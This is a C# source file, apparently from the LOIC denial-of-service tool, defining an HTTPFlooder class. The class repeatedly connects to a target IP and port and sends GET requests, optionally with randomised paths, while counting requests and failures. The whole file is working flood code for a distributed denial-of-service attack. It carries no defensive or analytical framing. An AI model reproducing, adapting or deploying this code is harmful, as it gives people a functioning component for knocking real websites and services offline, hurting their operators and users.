namespace LOIC
{
	#region using directives
	using System;
	using System.Net;
	using System.Net.Sockets;
	using System.Text;
	using System.Threading;
	using System.Windows.Forms;
	#endregion

	public class HTTPFlooder : BaseFlooder
	{
		#region Fields
		public RequestState State = RequestState.Ready;

		public int Downloaded { get; set; }
		public int Requested { get; set; }
		public int Failed { get; set; }

		public string Host { get; set; }
		public string IP { get; set; }
		public int Port { get; set; }

		public string Subsite { get; set; }
		public int Delay { get; set; }
		public int Timeout { get; set; }
		public bool Resp { get; set; }
		private System.Windows.Forms.Timer tTimepoll = new System.Windows.Forms.Timer ();

		private IPEndPoint remoteHost;
		private byte[] buffer;
		private long LastAction;
		private bool random;

		public enum RequestState
		{
			Ready,
			Connecting,
			Requesting,
			Downloading,
			Completed,
			Failed
		}
		#endregion

		#region Constructor
		public HTTPFlooder (string host, string ip, int port, string subSite, bool resp, int delay, int timeout, bool random)
			: base()
		{
			this.Host = host;
			this.IP = ip;
			this.Port = port;
			this.Subsite = subSite;
			this.Resp = resp;
			this.Delay = delay;
			this.Timeout = timeout;
			this.random = random;
		}
		#endregion

		#region Methods
		protected override void OnStart ()
		{
			LastAction = Tick ();
			tTimepoll = new System.Windows.Forms.Timer ();
			tTimepoll.Tick += new EventHandler (tTimepoll_Tick);
			tTimepoll.Start ();
			
			string bufferString;
			if (random) {
				bufferString = string.Format ("GET {0}{1} HTTP/1.1{2}Host: {3}{2}{2}{2}", Subsite, new Functions ().RandomString (), Environment.NewLine, Host);
			} else {
				bufferString = string.Format ("GET {0} HTTP/1.1{1}Host: {2}{1}{1}{1}", Subsite, Environment.NewLine, Host);
			}
			
			buffer = Encoding.ASCII.GetBytes (bufferString);
			remoteHost = new IPEndPoint (IPAddress.Parse (IP), Port);
		}

		protected override void OnRun ()
		{
			try {
				State = RequestState.Ready;
				
				// Sets state to ready
				LastAction = Tick ();
				byte[] recvBuf = new byte[64];
				var socket = new Socket (AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
				State = RequestState.Connecting;
				
				// Sets state to connecting
				while (IsFlooding) {
					try {
						socket.Connect (remoteHost);
					} catch {
						continue;
					}
					
					break;
				}
				
				socket.Blocking = Resp;
				State = RequestState.Requesting;
				
				// Sets state to requesting
				socket.Send (buffer, SocketFlags.None);
				State = RequestState.Downloading;
				Requested++;
				
				// Sets state to downloading (requested++)
				if (Resp) {
					socket.Receive (recvBuf, 64, SocketFlags.None);
				}
				
				State = RequestState.Completed;
				Downloaded++;
				
				// Sets state to downloaded (downloaded++)
				tTimepoll.Stop ();
				tTimepoll.Start ();
				if (Delay >= 0) {
					Thread.Sleep (Delay + 1);
				}
			} catch {
			} finally {
				IsFlooding = false;
			}
		}

		void tTimepoll_Tick (object sender, EventArgs e)
		{
			if (Tick () > LastAction + Timeout) {
				Failed++;
				State = RequestState.Failed;
				tTimepoll.Stop ();
				if (IsFlooding) {
					tTimepoll.Start ();
				}
			}
		}

		private static long Tick ()
		{
			return DateTime.Now.Ticks / 10000;
		}
		#endregion
	}
}
